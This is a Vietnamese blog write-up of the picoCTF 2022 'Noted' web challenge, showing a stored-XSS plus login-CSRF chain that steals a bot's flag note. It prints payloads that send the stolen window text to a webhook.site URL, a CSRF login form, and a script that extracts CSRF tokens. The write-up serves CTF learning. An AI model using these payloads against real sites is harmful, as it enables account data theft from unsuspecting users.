<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Noted - picoCTF2022" /><meta name="author" content="to^" /><meta property="og:locale" content="en" /><meta name="description" content="From picoCTF2022" /><meta property="og:description" content="From picoCTF2022" /><link rel="canonical" href="https://to016.github.io//posts/noted/" /><meta property="og:url" content="https://to016.github.io//posts/noted/" /><meta property="og:site_name" content="to^" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-04T22:08:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Noted - picoCTF2022" /><meta name="twitter:site" content="@nguyendt0" /><meta name="twitter:creator" content="@to^" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"to^"},"dateModified":"2022-05-11T09:54:10+07:00","datePublished":"2022-04-04T22:08:00+07:00","description":"From picoCTF2022","headline":"Noted - picoCTF2022","mainEntityOfPage":{"@type":"WebPage","@id":"https://to016.github.io//posts/noted/"},"url":"https://to016.github.io//posts/noted/"}</script><title>Noted - picoCTF2022 | to^</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="to^"><meta name="application-name" content="to^"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar.jpeg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">to^</a></div><div class="site-subtitle font-italic">Student, CTFer, web warrior</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/to016" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/nguyendt0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['todinhnguyen1610','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Noted - picoCTF2022</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/noted/pico.png" class="preview-img bg" alt="picoctf logo" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>Noted - picoCTF2022</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/nguyendt0">Tô Đỉnh Nguyên</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1649084880" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-04 </em> </span> <span> Updated <em class="timeago" data-ts="1652237650" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-11 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="702 words"> <em>3 min</em> read</span></div></div></div><div class="post-content"><h2 id="sơ-lược-về-challenge"><span class="mr-2"><em>Sơ lược về challenge</em></span><a href="#sơ-lược-về-challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Trang gồm có hai chức năng <code class="language-plaintext highlighter-rouge">Login</code> và <code class="language-plaintext highlighter-rouge">Register</code> <img data-src="/assets/img/noted/overview1.png" alt="overview1" data-proofer-ignore> <em>overview1</em></p><p>Tiếp đó ta thể tạo note và gửi link để report. <img data-src="/assets/img/noted/overview2.png" alt="overview2" data-proofer-ignore> <em>overview2</em></p><h2 id="phân-tích"><span class="mr-2">Phân tích</span><a href="#phân-tích" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Sau khi thử thì mình nhận thấy có lỗi xss ở đây <a href="https://user-images.githubusercontent.com/77546253/161594213-8d0c1949-c9f1-410b-ae70-890f10590c89.mp4" title="Link Title"><img data-src="/assets/img/noted/overview2.png" alt="test note" data-proofer-ignore></a> <em>Click to play video</em></p><p>Suy ra bài này là một dạng Self Store XSS</p><p>Cũng tương tự như các bài xss khác, chức năng report sẽ làm con bot (đóng vai trò như admin) access đến link mà ta gửi. <img data-src="/assets/img/noted/report.png" alt="report" data-proofer-ignore> <em>report.js</em> Bot sẽ tạo một tài khoản với tk, mk random và tạo một note với content chính là flag. Sau đó sẽ access tới url được report.</p><p>Trong <code class="language-plaintext highlighter-rouge">web.js</code> có thể thấy server dùng csrf token trong các route. <img data-src="/assets/img/noted/webjs.png" alt="csrf" data-proofer-ignore> <em>web.js</em></p><h2 id="khai-thác"><span class="mr-2"><em>Khai thác</em></span><a href="#khai-thác" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Bởi vì sau khi vừa tạo note thì phiên hoạt động của bot vẫn còn hiệu lực nên từ đó ta sẽ nghĩ cách để có thể lấy nội dung từ trang <code class="language-plaintext highlighter-rouge">/notes</code> của con bot (chứa flag) và gửi đến webhook hoặc có thể tạo một note mới với content là flag ở account của ta.</p><p>Bởi vì sau khi vừa tạo note thì session của bot vẫn còn lưu trên trình duyệt nên từ đó ta sẽ nghĩ cách để có thể lấy nội dung từ trang <code class="language-plaintext highlighter-rouge">/notes</code> của con bot (chứa flag) và gửi đến webbook hoặc có thể tạo một note mới với content là flag ở account của ta.</p><h3 id="gửi-đến-webhook"><span class="mr-2">Gửi đến webhook</span><a href="#gửi-đến-webhook" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Cách này không đòi hỏi phải extract csrf token <img data-src="/assets/img/noted/flow1.png" alt="flow1" data-proofer-ignore> <em>flow1</em></p><p>Đầu tiên ta khởi tạo 1 account với <code class="language-plaintext highlighter-rouge">tk,mk: bla</code> mục đích là lưu xss script có vai trò gửi nội dung của <code class="language-plaintext highlighter-rouge">window</code> chứa flag tới webhook của ta.</p><p>XSS note sẽ có nội dung như sau:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="dl">'</span><span class="s1">pwn</span><span class="dl">'</span><span class="p">))</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://webhook.site/&lt;id&gt;?</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">flag</span><span class="dl">'</span><span class="p">).</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">textContent</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Ở đây ta dùng <code class="language-plaintext highlighter-rouge">window.location.search.includes</code> là để tránh việc bị redirect liên tục tới webhook.</p><p>Tiếp theo ở exploit server ta tạo một <code class="language-plaintext highlighter-rouge">index.html</code> với layout <img data-src="/assets/img/noted/exp_sv.png" alt="exploit server" data-proofer-ignore> <em>flow2</em></p><p>Csrf form sẽ là:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">'http://0.0.0.0:8080/login'</span> <span class="na">method=</span><span class="s">'POST'</span> <span class="na">id=</span><span class="s">'csrf'</span> <span class="na">target=</span><span class="s">'_blank'</span><span class="nt">&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">value=</span><span class="s">"bla"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">value=</span><span class="s">"bla"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
</pre></table></code></div></div><p>Script để exploit sẽ là:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>    <span class="nt">&lt;script&gt;</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://0.0.0.0:8080/notes</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">flag</span><span class="dl">'</span><span class="p">);</span>
        <span class="nx">setTimeout</span><span class="p">(</span><span class="s2">`csrf.submit()`</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>
        <span class="nx">setTimeout</span><span class="p">(</span><span class="s2">`window.location='http://0.0.0.0:8080/notes?pwn'`</span><span class="p">,</span> <span class="mi">1500</span><span class="p">);</span>
    <span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Trong csrf form ta thêm thuộc tính <code class="language-plaintext highlighter-rouge">target</code> và gán giá trị bằng <code class="language-plaintext highlighter-rouge">_blank</code> để reponse trả về từ <code class="language-plaintext highlighter-rouge">action</code> sẽ mở ở tab mới nếu không các dòng javascript ở bên dưới sẽ không được thực thi.</p><p>Để hiểu rõ hơn về cách khai thác này ta sẽ đặt tất cả lại với nhau:</p><ul><li>Đầu tiên gửi cho con bot link exploit server, bot sẽ truy cập tới exploit server hay cụ thể là <code class="language-plaintext highlighter-rouge">index.html</code><li>Đoạn script ở <code class="language-plaintext highlighter-rouge">index.html</code> sẽ open new tab với tên là <code class="language-plaintext highlighter-rouge">flag</code> (sẽ không yêu cầu nhập username, password bởi vì phiên hoạt động của bot vẫn còn và cửa sổ này sẽ chứa note với content là flag)<li>Sau 1s thì submit csrf form lúc này bot sẽ login vào account ta vừa tạo và kết quả hiển thị ở <code class="language-plaintext highlighter-rouge">new blank tab</code><li>Sau 1,5s thì chuyển hướng từ exploit page đến <code class="language-plaintext highlighter-rouge">http://0.0.0.0:8080/notes?pwn</code> lưu ý rằng ở đoạn code trước ta đã đăng nhập vào tài khoản <code class="language-plaintext highlighter-rouge">bla</code> nên bây giờ cũng sẽ chuyển hướng tới <code class="language-plaintext highlighter-rouge">/notes</code> của <code class="language-plaintext highlighter-rouge">bla</code>. <code class="language-plaintext highlighter-rouge">?pwn</code> dùng để trigger store xss và gửi nội dung cửa sổ <code class="language-plaintext highlighter-rouge">flag</code> đến webhook. Có thể thấy lúc này ta không hề vi phạm <code class="language-plaintext highlighter-rouge">same origin policy</code> khi lấy <code class="language-plaintext highlighter-rouge">document.body.textContent</code> từ cửa sổ <code class="language-plaintext highlighter-rouge">flag</code> bởi vì chúng đều thuộc cùng domain, port và scheme.</ul><p>Và kết quả: <img data-src="/assets/img/noted/result.png" alt="result" data-proofer-ignore> <em>result</em></p><h3 id="extract-csrf-token"><span class="mr-2">Extract csrf token</span><a href="#extract-csrf-token" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Ở cách này thì form csrf vẫn như cách kia nhưng có sự thay đổi về xss note và script exploit</p><p>Script exploit:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>    <span class="nt">&lt;script&gt;</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://0.0.0.0:8080/notes</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">flag</span><span class="dl">'</span><span class="p">)</span>
        <span class="nx">setTimeout</span><span class="p">(</span><span class="s2">`csrf.submit()`</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>
    <span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>XSS note:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/new</span><span class="dl">"</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="c1">//extract csrf token từ '/new'</span>
    <span class="kd">let</span> <span class="nx">csrf</span> <span class="o">=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/_csrf" value="</span><span class="se">([^</span><span class="sr">"</span><span class="se">]</span><span class="sr">*</span><span class="se">)</span><span class="sr">/</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
    <span class="c1">//lấy flag</span>
    <span class="kd">let</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">flag</span><span class="dl">'</span><span class="p">).</span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">"</span><span class="s2">body&gt;div&gt;p</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">;</span>
    <span class="c1">//tạo note với content là flag ở account của ta</span>
    <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/new</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="na">body</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span> <span class="na">_csrf</span><span class="p">:</span> <span class="nx">csrf</span><span class="p">,</span> <span class="na">title</span><span class="p">:</span> <span class="dl">"</span><span class="s2">PWNED!!!</span><span class="dl">"</span><span class="p">,</span> <span class="na">content</span><span class="p">:</span> <span class="nx">flag</span> <span class="p">}),</span> <span class="na">headers</span><span class="p">:</span> <span class="p">{</span> <span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span> <span class="p">}</span> <span class="p">});</span>
<span class="p">});</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Kết quả: <img data-src="/assets/img/noted/result'.png" alt="result'" data-proofer-ignore> <em>result</em></p><h2 id="tham-khảo"><span class="mr-2"><em>Tham khảo</em></span><a href="#tham-khảo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://docs.abbasmj.com/ctf-writeups/picoctf-2022#noted">https://docs.abbasmj.com/ctf-writeups/picoctf-2022#noted</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/websec/'>WebSec</a>, <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/csrf/" class="post-tag no-text-decoration" >csrf</a> <a href="/tags/xss/" class="post-tag no-text-decoration" >xss</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Noted - picoCTF2022 - to^&amp;url=https://to016.github.io//posts/noted/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Noted - picoCTF2022 - to^&amp;u=https://to016.github.io//posts/noted/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://to016.github.io//posts/noted/&amp;text=Noted - picoCTF2022 - to^" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PHPLFI2RCE/">Các kĩ thuật nâng cao trong khai thác lỗ hổng PHP LFI2RCE</a><li><a href="/posts/angstromctf2022/">AngstromCTF 2022</a><li><a href="/posts/SWandMITM/">Service worker và Man-in-the-Middle Attack</a><li><a href="/posts/noted/">Noted - picoCTF2022</a><li><a href="/posts/31linephp/">31 Line PHP - SPbCTF2021</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/noCookies/"><div class="card-body"> <em class="timeago small" data-ts="1649398020" > 2022-04-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NoCookies - DiceCTF2022</h3><div class="text-muted small"><p> Link challenge https://instancer.mc.ax/no-cookies https://admin-bot.mc.ax/no-cookies Source code Download Sơ lược về trang web overview Sẽ có 2 chức năng: Register -&amp;gt; đăng kí account và ...</p></div></div></a></div><div class="card"> <a href="/posts/nahamconctf2022/"><div class="card-body"> <em class="timeago small" data-ts="1651342200" > 2022-05-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NahamconCTF 2022</h3><div class="text-muted small"><p> Solution for some web challenges solved challenges EXtravagant Upload exp.xml and view it 1 2 3 &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;/var/www/...</p></div></div></a></div><div class="card"> <a href="/posts/angstromctf2022/"><div class="card-body"> <em class="timeago small" data-ts="1651505100" > 2022-05-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AngstromCTF 2022</h3><div class="text-muted small"><p> My solution for some web challenges in this competition The Flash Use DOM breakpoints in Chrome devtools, right click on p tag and chose Break on -&amp;gt; subtree modifications then step over to get...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/slippingBeauty/" class="btn btn-outline-primary" prompt="Older"><p>Slipping beauty - webhacking.kr</p></a> <a href="/posts/31linephp/" class="btn btn-outline-primary" prompt="Newer"><p>31 Line PHP - SPbCTF2021</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "to016/to016.github.io", "data-repo-id": "R_kgDOHGuNaQ", "data-category": "Comments", "data-category-id": "DIC_kwDOHGuNac4CPNhc", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "bottom", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/nguyendt0">Tô Đỉnh Nguyên</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: 